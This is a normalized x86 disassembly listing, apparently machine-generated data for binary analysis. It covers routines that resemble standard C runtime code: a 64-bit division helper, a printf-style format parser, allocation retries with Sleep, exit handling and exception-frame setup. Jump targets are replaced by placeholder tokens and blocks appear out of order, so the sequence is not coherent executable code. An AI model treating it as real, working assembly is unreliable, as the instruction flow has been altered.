push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
cmp [ rw-data ] eax
jne r-xdata
push eax
push rw-data
jmp r-xdata
call sub_406f2e
add esp 0x14
pop ebp
retn
sub_407190
push esi
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x8 ]
div ecx
mov esi eax
mov eax ebx
mul [ esp + 0x10 ]
mov ecx eax
mov eax esi
mul [ esp + 0x10 ]
add edx ecx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x14 ]
mov ecx eax
mov eax [ esp + 0x10 ]
mul esi
add edx ecx
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
mov ecx edx
mov edx ebx
mov ebx ecx
mov ecx eax
mov eax esi
pop esi
retn 0x10
dec esi
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
xor ebx ebx
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_407225
mov edi edi
push ebp
mov ebp esp
sub esp 0x280
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x254 ]
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x258 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x23c ] eax
call sub_405cbc
call sub_405926
mov [ ebp - 0x264 ] eax
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_405926
mov [ eax ] 0x16
call sub_4058d4
cmp [ ebp - 0x248 ] 0x0
je r-xdata
xor esi esi
cmp ebx esi
je r-xdata
push esi
call sub_40b3e6
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x24c ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ ebx ]
mov [ ebp - 0x224 ] esi
mov [ ebp - 0x228 ] esi
mov [ ebp - 0x244 ] esi
mov [ ebp - 0x260 ] esi
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40568f
leave
retn
cmp [ ebp - 0x248 ] 0x0
je r-xdata
inc ebx
mov [ ebp - 0x240 ] ebx
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x24c ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x244 ] 0x0
je r-xdata
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp [ ebp - 0x244 ] 0x7
jne r-xdata
xor eax eax
movsx eax dl
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
push 0x7
pop ecx
cmp eax ecx
ja r-xdata
mov ecx [ ebp - 0x244 ]
imul eax eax 0x9
movzx eax [ eax + ecx + r--data ]
push 0x8
shr eax 0x4
pop esi
mov [ ebp - 0x244 ] eax
cmp eax esi
je r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ebx [ ebp - 0x240 ]
mov al [ ebx ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + jump_table_407e39 ]
mov edi [ ebp - 0x21c ]
xor esi esi
mov dl al
jmp r-xdata
xor eax eax
or [ ebp - 0x218 ] 0xffffffff
mov [ ebp - 0x274 ] eax
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x238 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x23c ] eax
jmp r-xdata
movsx eax dl
sub eax 0x20
je r-xdata
cmp dl 0x2a
jne r-xdata
and [ ebp - 0x218 ] 0x0
jmp r-xdata
cmp dl 0x2a
jne r-xdata
cmp dl 0x49
je r-xdata
and [ ebp - 0x23c ] 0x0
lea eax [ ebp - 0x254 ]
push eax
movzx eax dl
push eax
call sub_40bfd4
pop ecx
test eax eax
mov al [ ebp - 0x211 ]
pop ecx
je r-xdata
movsx eax dl
cmp eax 0x64
jg r-xdata
or [ ebp - 0x210 ] 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x238 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x238 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x238 ] edi
test edi edi
jns r-xdata
mov eax [ ebp - 0x218 ]
imul eax eax 0xa
movsx ecx dl
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x218 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x218 ] edi
test edi edi
jns r-xdata
mov al [ ebx ]
cmp al 0x36
jne r-xdata
cmp dl 0x68
je r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
call sub_405d43
jmp r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
call sub_405d43
mov al [ ebx ]
inc ebx
mov [ ebp - 0x240 ] ebx
test al al
je r-xdata
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x80
jmp r-xdata
sub eax esi
je r-xdata
or [ ebp - 0x210 ] 0x4
neg [ ebp - 0x238 ]
jmp r-xdata
or [ ebp - 0x218 ] 0xffffffff
jmp r-xdata
cmp al 0x33
jne r-xdata
cmp [ ebx + 0x1 ] 0x34
jne r-xdata
or [ ebp - 0x210 ] 0x20
jmp r-xdata
cmp dl 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x210 ] 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x64
je r-xdata
cmp [ ebx + 0x1 ] 0x32
jne r-xdata
add ebx 0x2
or [ ebp - 0x210 ] 0x8000
mov [ ebp - 0x240 ] ebx
jmp r-xdata
cmp [ ebx ] 0x6c
jne r-xdata
cmp dl 0x77
jne r-xdata
mov ecx [ ebp - 0x218 ]
cmp ecx 0xffffffff
jne r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x218 ] esi
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
add edi esi
mov eax [ edi - 0x8 ]
mov edx [ edi - 0x4 ]
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x210 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp al 0x69
je r-xdata
add ebx 0x2
and [ ebp - 0x210 ] 0xffff7fff
mov [ ebp - 0x240 ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x10
jmp r-xdata
inc ebx
or [ ebp - 0x210 ] 0x1000
mov [ ebp - 0x240 ] ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x21c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x220 ] edi
je r-xdata
mov ecx 0x7fffffff
mov [ ebp - 0x228 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x210 ] 0x80
mov [ ebp - 0x228 ] 0x10
je r-xdata
cmp [ ebp - 0x25c ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x21c ] edi
mov [ ebp - 0x258 ] ecx
jmp r-xdata
dec eax
dec eax
je r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x210 ] esi
jmp r-xdata
cmp al 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov edi [ ebp - 0x21c ]
mov [ ebp - 0x258 ] 0x27
mov ecx [ ebp - 0x210 ]
test ecx 0x8000
je r-xdata
mov al [ ebp - 0x258 ]
add al 0x51
mov [ ebp - 0x22c ] 0x30
mov [ ebp - 0x22b ] al
mov [ ebp - 0x234 ] 0x2
jmp r-xdata
cmp [ ebp - 0x260 ] 0x0
je r-xdata
mov ecx [ ebp - 0x210 ]
test cl 0x40
je r-xdata
mov edi [ ebp - 0x21c ]
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x21c ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x210 ] 0x9000
mov edi edx
mov ebx eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x21c ] edi
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x210 ] 0x800
add dl 0x20
mov [ ebp - 0x274 ] 0x1
mov [ ebp - 0x211 ] dl
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x75
je r-xdata
mov eax [ ebp - 0x220 ]
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
mov eax [ ebp - 0x220 ]
mov [ ebp - 0x23c ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
push [ ebp - 0x260 ]
call sub_405655
and [ ebp - 0x260 ] 0x0
pop ecx
mov eax [ ebp - 0x238 ]
sub eax [ ebp - 0x228 ]
sub eax [ ebp - 0x234 ]
mov [ ebp - 0x268 ] eax
test cl 0xc
jne r-xdata
test ecx 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x218 ] 0x6
jmp r-xdata
mov edi [ ebp - 0x21c ]
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x218 ] 0x0
jge r-xdata
xor edi edi
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x220 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
or [ ebp - 0x210 ] 0x40
cmp [ ebp - 0x218 ] 0x0
lea ebx [ ebp - 0x20c ]
mov eax 0x200
mov [ ebp - 0x220 ] ebx
mov [ ebp - 0x268 ] eax
jge r-xdata
dec eax
dec eax
jne r-xdata
test [ ebp - 0x210 ] 0x830
jne r-xdata
dec eax
dec eax
je r-xdata
cmp al 0x78
je r-xdata
test ecx ecx
jne r-xdata
test ecx ecx
jne r-xdata
push [ ebp - 0x234 ]
mov edi [ ebp - 0x264 ]
mov ebx [ ebp - 0x230 ]
lea eax [ ebp - 0x22c ]
push eax
lea eax [ ebp - 0x224 ]
call sub_405d76
test [ ebp - 0x210 ] 0x8
pop ecx
pop ecx
je r-xdata
mov edi eax
jmp r-xdata
test cl 0x1
je r-xdata
mov [ ebp - 0x22c ] 0x2d
jmp r-xdata
cmp [ ebp - 0x218 ] eax
jle r-xdata
cmp dl 0x67
jne r-xdata
mov eax [ edi ]
mov esi [ DecodePointer@IAT ]
add edi 0x8
mov [ ebp - 0x280 ] eax
mov eax [ edi - 0x4 ]
mov [ ebp - 0x27c ] eax
lea eax [ ebp - 0x254 ]
push eax
push [ ebp - 0x274 ]
movsx eax dl
push [ ebp - 0x218 ]
mov [ ebp - 0x21c ] edi
push eax
push [ ebp - 0x268 ]
lea eax [ ebp - 0x280 ]
push ebx
push eax
push [ rw-data ]
call esi
call eax
mov edi [ ebp - 0x210 ]
add esp 0x1c
and edi 0x80
je r-xdata
add [ ebp - 0x21c ] 0x4
mov eax [ ebp - 0x21c ]
mov esi [ eax - 0x4 ]
call sub_40be4c
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x210 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x218 ] eax
jle r-xdata
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x210 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x228 ] eax
test [ ebp - 0x210 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x220 ] ecx
je r-xdata
mov edi [ ebp - 0x21c ]
add edi 0x4
test [ ebp - 0x210 ] 0x810
mov [ ebp - 0x21c ] edi
je r-xdata
or [ ebp - 0x210 ] 0x800
jmp r-xdata
dec eax
dec eax
jne r-xdata
cmp al 0x58
je r-xdata
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x220 ]
dec ecx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x220 ]
sar eax 0x1
jmp r-xdata
cmp [ ebp - 0x23c ] 0x0
mov eax [ ebp - 0x228 ]
je r-xdata
test [ ebp - 0x210 ] 0x4
jne r-xdata
test edi edi
jg r-xdata
test cl 0x2
je r-xdata
mov [ ebp - 0x22c ] 0x2b
jmp r-xdata
mov [ ebp - 0x234 ] 0x1
cmp [ ebp - 0x218 ] 0xa3
jle r-xdata
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x218 ] 0x1
jmp r-xdata
cmp [ ebp - 0x211 ] 0x67
jne r-xdata
cmp [ ebp - 0x218 ] 0x0
jne r-xdata
test [ ebp - 0x210 ] 0x20
je r-xdata
test [ ebp - 0x210 ] 0x80
mov edi [ ebp - 0x21c ]
mov [ ebp - 0x228 ] esi
je r-xdata
mov eax ebx
or eax edi
jne r-xdata
mov [ ebp - 0x218 ] eax
and [ ebp - 0x23c ] 0x0
jmp r-xdata
cdq
sub eax edx
sar eax 0x1
mov [ ebp - 0x23c ] 0x1
jmp r-xdata
mov al [ edi - 0x4 ]
mov [ ebp - 0x20c ] al
mov [ ebp - 0x228 ] 0x1
movzx eax [ edi - 0x4 ]
push eax
push 0x200
lea eax [ ebp - 0x20c ]
push eax
lea eax [ ebp - 0x228 ]
push eax
call sub_40bfb7
add esp 0x10
test eax eax
je r-xdata
and [ ebp - 0x244 ] 0x0
inc eax
add eax 0x2
mov edi [ ebp - 0x264 ]
push eax
push [ ebp - 0x220 ]
lea eax [ ebp - 0x224 ]
call sub_405d76
pop ecx
pop ecx
test eax eax
jle r-xdata
mov edi [ ebp - 0x268 ]
jmp r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
mov al 0x20
dec edi
call sub_405d43
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
mov [ ebp - 0x22c ] 0x20
mov esi [ ebp - 0x218 ]
add esi 0x15d
push esi
call sub_407e59
mov dl [ ebp - 0x211 ]
pop ecx
mov [ ebp - 0x260 ] eax
test eax eax
je r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
test edi edi
jne r-xdata
lea eax [ ebp - 0x254 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov eax [ ebp - 0x224 ]
mov [ esi ] eax
mov ax [ ebp - 0x224 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x210 ] 0x200
jmp r-xdata
lea esi [ ebp - 0xd ]
and [ ebp - 0x234 ] eax
lea eax [ ebp - 0x20c ]
mov [ ebp - 0x220 ] eax
jmp r-xdata
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
test [ ebp - 0x210 ] 0x4
je r-xdata
mov esi [ ebp - 0x220 ]
mov [ ebp - 0x270 ] eax
test edi edi
jg r-xdata
mov [ ebp - 0x218 ] 0xa3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x268 ] esi
mov ebx eax
jmp r-xdata
push ebx
jmp r-xdata
or [ ebp - 0x210 ] 0x100
inc ebx
mov [ ebp - 0x220 ] ebx
lea eax [ ebp - 0x254 ]
push eax
push ebx
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x25c ] 0x1
jmp r-xdata
mov eax [ ebp - 0x228 ]
cdq
push edx
push eax
push edi
push ebx
call sub_407190
add ecx 0x30
mov [ ebp - 0x268 ] ebx
mov ebx eax
mov edi edx
cmp ecx 0x39
jle r-xdata
mov eax ebx
or eax edi
je r-xdata
mov edi [ ebp - 0x268 ]
jmp r-xdata
or [ ebp - 0x224 ] 0xffffffff
jmp r-xdata
cmp [ ebp - 0x278 ] eax
je r-xdata
lea esi [ ebp - 0x224 ]
mov ecx ebx
mov al 0x30
dec edi
call sub_405d43
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
call sub_408640
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x258 ]
lea eax [ ebp - 0xd ]
sub eax esi
inc esi
test [ ebp - 0x210 ] 0x200
mov [ ebp - 0x228 ] eax
mov [ ebp - 0x220 ] esi
je r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0x224 ] 0x0
jl r-xdata
push [ ebp - 0x278 ]
mov edi [ ebp - 0x264 ]
mov ebx [ ebp - 0x230 ]
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x224 ]
call sub_405d76
cmp [ ebp - 0x270 ] 0x0
pop ecx
pop ecx
jne r-xdata
mov eax [ ebp - 0x218 ]
dec [ ebp - 0x218 ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov ecx [ ebp - 0x230 ]
lea esi [ ebp - 0x224 ]
mov al 0x20
dec edi
call sub_405d43
cmp [ ebp - 0x224 ] 0xffffffff
je r-xdata
movzx eax [ esi ]
dec [ ebp - 0x270 ]
push eax
push 0x6
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x278 ]
push eax
add esi 0x2
call sub_40bfb7
add esp 0x10
test eax eax
jne r-xdata
jmp r-xdata
dec [ ebp - 0x220 ]
mov ecx [ ebp - 0x220 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_407e59
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_4055c1
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_407e9e
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40c114
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_407eea
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40c196
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_407f38
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_40c243
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_407f8a
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_405926
mov [ eax ] 0x16
call sub_4058d4
or eax 0xffffffff
pop ebp
retn
sub_407fbd
mov edi edi
push ebp
mov ebp esp
push r--data
call [ GetModuleHandleW@IAT ]
test eax eax
je r-xdata
pop ebp
retn
push r--data
push eax
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call eax
sub_408012
mov edi edi
push esi
call sub_4069e0
mov esi eax
push esi
call sub_4085b3
push esi
call sub_40574a
push esi
call sub_40c50f
push esi
call sub_40c500
push esi
call sub_40c2fb
push esi
call sub_40c2ea
add esp 0x18
pop esi
retn
sub_408045
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
jmp r-xdata
cmp esi [ ebp + 0xc ]
jb r-xdata
test eax eax
jne r-xdata
pop esi
pop ebp
retn
mov ecx [ esi ]
test ecx ecx
je r-xdata
add esi 0x4
call ecx
sub_408069
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
call sub_40be29
push r--data
push r--data
call sub_408045
pop ecx
pop ecx
test eax eax
jne r-xdata
push rw-data
call sub_40c5b0
pop ecx
test eax eax
je r-xdata
pop ebp
retn
push esi
push edi
push sub_40a1c1
call sub_404e18
mov eax r--data
mov esi r--data
pop ecx
mov edi eax
cmp eax esi
jae r-xdata
push [ ebp + 0x8 ]
call [ rw-data ]
pop ecx
cmp [ rw-data ] 0x0
pop edi
pop esi
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
xor eax eax
push rw-data
call sub_40c5b0
pop ecx
test eax eax
je r-xdata
add edi 0x4
cmp edi esi
jb r-xdata
call eax
push 0x0
push 0x2
push 0x0
call [ rw-data ]
sub_408100
push 0x20
push r--data
call sub_4082b0
push 0x8
call sub_40a6c4
pop ecx
and [ ebp - 0x4 ] 0x0
xor eax eax
inc eax
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_40822b
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov al [ ebp + 0x10 ]
mov [ rw-data ] al
cmp [ ebp + 0xc ] 0x0
jne r-xdata
call sub_4082f5
retn
mov [ rw-data ] 0x1
push 0x8
call sub_40a5eb
pop ecx
push [ ebp + 0x8 ]
call sub_407fe8
mov [ ebp - 0x20 ] r--data
push [ rw-data ]
mov esi [ DecodePointer@IAT ]
call esi
mov ebx eax
mov [ ebp - 0x30 ] ebx
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
mov eax [ eax ]
test eax eax
je r-xdata
mov [ ebp - 0x1c ] r--data
push [ rw-data ]
call esi
mov edi eax
mov [ ebp - 0x2c ] edi
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x28 ] edi
add [ ebp - 0x20 ] 0x4
jmp r-xdata
call eax
mov eax [ ebp - 0x1c ]
mov eax [ eax ]
test eax eax
je r-xdata
call sub_4069e0
cmp [ edi ] eax
je r-xdata
cmp [ ebp - 0x20 ] r--data
jae r-xdata
add [ ebp - 0x1c ] 0x4
jmp r-xdata
call eax
sub edi 0x4
mov [ ebp - 0x2c ] edi
cmp edi ebx
jb r-xdata
cmp edi ebx
jb r-xdata
cmp [ ebp - 0x1c ] r--data
jae r-xdata
push [ edi ]
call esi
mov ebx eax
call sub_4069e0
mov [ edi ] eax
call ebx
push [ rw-data ]
call esi
mov ebx eax
push [ rw-data ]
call esi
cmp [ ebp - 0x24 ] ebx
jne r-xdata
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x28 ] eax
mov edi eax
mov [ ebp - 0x2c ] edi
cmp [ ebp - 0x28 ] eax
je r-xdata
mov ebx [ ebp - 0x30 ]
jmp r-xdata
sub_4082b0
push sub_408310
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_408310
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40568f
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40568f
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_40a83b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_40a7f2
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_40568f
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40568f
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_40a822
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_40a83b
mov eax [ ebp + 0xc ]
push rw-data
call sub_40c5b0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_40568f
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_40a809
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_40568f
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ rw-data ]
add esp 0x8
sub_4084c9
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push edi
mov edi ecx
je r-xdata
pop edi
pop ebp
retn 0x4
push esi
push [ ebp + 0x8 ]
call sub_408640
lea esi [ eax + 0x1 ]
push esi
call sub_4055c1
pop ecx
pop ecx
mov [ edi + 0x4 ] eax
test eax eax
je r-xdata
pop esi
push [ ebp + 0x8 ]
push esi
push eax
call sub_4049b3
add esp 0xc
mov [ edi + 0x8 ] 0x1
sub_408527
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp edi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
call sub_408509
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x4 ] eax
push [ esi + 0x4 ]
mov ecx edi
call sub_4084c9
jmp r-xdata
sub_408567
mov edi edi
push ebp
mov ebp esp
push esi
